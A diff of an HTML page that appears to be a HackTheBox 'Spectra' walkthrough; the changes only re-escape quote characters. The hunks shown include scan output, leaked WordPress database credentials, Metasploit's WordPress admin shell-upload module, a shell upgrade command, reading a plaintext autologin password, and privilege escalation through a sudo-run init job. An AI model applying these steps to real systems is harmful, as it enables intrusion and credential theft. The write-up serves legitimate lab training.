@@ -218,7 +218,7 @@ PORT     STATE SERVICE VERSION
 |_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
 80/tcp   open  http    nginx 1.17.4
 |_http-server-header: nginx/1.17.4
-|_http-title: Site doesn't have a title (text/html).
+|_http-title: Site doesn&#39;t have a title (text/html).
 3306/tcp open  mysql   MySQL (unauthorized)
 |_ssl-cert: ERROR: Script execution failed (use -d to debug)
 |_ssl-date: ERROR: Script execution failed (use -d to debug)
@@ -316,22 +316,22 @@ a look.</p>
 database.</p>
 <pre tabindex="0"><code>// ** MySQL settings - You can get this info from your web host ** //
 /** The name of the database for WordPress */
-define( 'DB_NAME', 'dev' );
+define( &#39;DB_NAME&#39;, &#39;dev&#39; );
 
 /** MySQL database username */
-define( 'DB_USER', 'devtest' );
+define( &#39;DB_USER&#39;, &#39;devtest&#39; );
 
 /** MySQL database password */
-define( 'DB_PASSWORD', 'devteam01' );
+define( &#39;DB_PASSWORD&#39;, &#39;devteam01&#39; );
 
 /** MySQL hostname */
-define( 'DB_HOST', 'localhost' );
+define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
 
 /** Database Charset to use in creating database tables. */
-define( 'DB_CHARSET', 'utf8' );
+define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );
 
-/** The Database Collate type. Don't change this if in doubt. */
-define( 'DB_COLLATE', '' );
+/** The Database Collate type. Don&#39;t change this if in doubt. */
+define( &#39;DB_COLLATE&#39;, &#39;&#39; );
 </code></pre><p>Let&rsquo;s try to log into WordPress with these credentials. From the portal, we can go ahead and find
 the login panel and attempt a login.</p>
 <p><img src="/img/htb-spectra/user-login-devtest-fail.png" alt=""></p>
@@ -409,7 +409,7 @@ Module options (exploit/unix/webapp/wp_admin_shell_upload):
    ----       ---------------  --------  -----------
    PASSWORD                    yes       The WordPress password to authenticate with
    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
    RPORT      80               yes       The target port (TCP)
    SSL        false            no        Negotiate SSL/TLS for outgoing connections
    TARGETURI  /                yes       The base path to the wordpress application
@@ -487,7 +487,7 @@ sh: 0: getcwd() failed: No such file or directory
 </code></pre><p>Once the Meterpreter session is open, we can use the <code>shell</code> command to drop to an <code>sh</code> shell. It is
 pretty limited (no echo, no prompt) so we can upgrade it to an interactive shell using the following
 python command</p>
-<pre tabindex="0"><code>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+<pre tabindex="0"><code>python3 -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;
 </code></pre><p>The <code>pty</code> package stands for &ldquo;Pseudo-Terminal Utilities&rdquo; and <code>spawn</code> simply spawns a new process,
 <code>/bin/bash</code> in our case. The full documentation is available
 <a href="https://docs.python.org/3/library/pty.html#pty.spawn">here</a>.</p>
@@ -532,8 +532,8 @@ cat autologin.conf.orig
 # Copyright 2016 The Chromium OS Authors. All rights reserved.
 # Use of this source code is governed by a BSD-style license that can be
 # found in the LICENSE file.
-description   &quot;Automatic login at boot&quot;
-author        &quot;chromium-os-dev@chromium.org&quot;
+description   &#34;Automatic login at boot&#34;
+author        &#34;chromium-os-dev@chromium.org&#34;
 # After boot-complete starts, the login prompt is visible and is accepting
 # input.
 start on started boot-complete
@@ -541,12 +541,12 @@ script
   passwd=
   # Read password from file. The file may optionally end with a newline.
   for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
-    if [ -e &quot;${dir}/passwd&quot; ]; then
-      passwd=&quot;$(cat &quot;${dir}/passwd&quot;)&quot;
+    if [ -e &#34;${dir}/passwd&#34; ]; then
+      passwd=&#34;$(cat &#34;${dir}/passwd&#34;)&#34;
       break
     fi
   done
-  if [ -z &quot;${passwd}&quot; ]; then
+  if [ -z &#34;${passwd}&#34; ]; then
     exit 0
   fi
   # Inject keys into the login prompt.
@@ -554,7 +554,7 @@ script
   # For this to work, you must have already created an account on the device.
   # Otherwise, no login prompt appears at boot and the injected keys do the
   # wrong thing.
-  /usr/local/sbin/inject-keys.py -s &quot;${passwd}&quot; -k enter
+  /usr/local/sbin/inject-keys.py -s &#34;${passwd}&#34; -k enter
 end script
 </code></pre><p>A Google search for this file also yields the same result &ndash; turns out this is a system file on
 <a href="https://chromium.googlesource.com/chromiumos/overlays/chromiumos-overlay/+/master/chromeos-base/autologin/files/init/autologin.conf">Chrome OS</a>.
@@ -565,7 +565,6 @@ login feature and you can configure this by providing a password in the <code>/e
 . Let&rsquo;s see if such a file exists and dump its contents if it does.</p>
 <pre tabindex="0"><code>nginx@spectra /opt $ cat /etc/autologin/passwd
 SummerHereWeCome!!
-
 </code></pre><p>Someone&rsquo;s excited for summer! It&rsquo;s hard to confirm if its <code>katie</code>&rsquo;s password or the password of an
 other user since the autologin feature doesn&rsquo;t seem to distinguish users or user names. In any case,
 the only way to find out is to try it out.</p>
@@ -645,8 +644,8 @@ making that new file world readable. The second part is necessary because we wan
 new file, which will be owned by <code>root</code>, is world readable so that <code>katie</code> can access it. Here&rsquo;s
 what our <code>test.conf</code> should look like:</p>
 <pre tabindex="0"><code>katie@spectra /etc/init $ cat test.conf
-description &quot;Test node.js server&quot;
-author      &quot;katie&quot;
+description &#34;Test node.js server&#34;
+author      &#34;katie&#34;
 
 start on filesystem or runlevel [2345]
 stop on shutdown
@@ -658,14 +657,13 @@ script
 end script
 
 pre-start script
-    echo &quot;[`date`] Node Test Starting&quot; &gt;&gt; /var/log/nodetest.log
+    echo &#34;[`date`] Node Test Starting&#34; &gt;&gt; /var/log/nodetest.log
 end script
 
 pre-stop script
     rm /var/run/nodetest.pid
-    echo &quot;[`date`] Node Test Stopping&quot; &gt;&gt; /var/log/nodetest.log
+    echo &#34;[`date`] Node Test Stopping&#34; &gt;&gt; /var/log/nodetest.log
 end script
-
 </code></pre><p>The only thing left to do now is run the test job and reap the fruit of our efforts.</p>
 <pre tabindex="0"><code>katie@spectra /etc/init $ sudo /sbin/initctl start test
 test start/running, process 9474
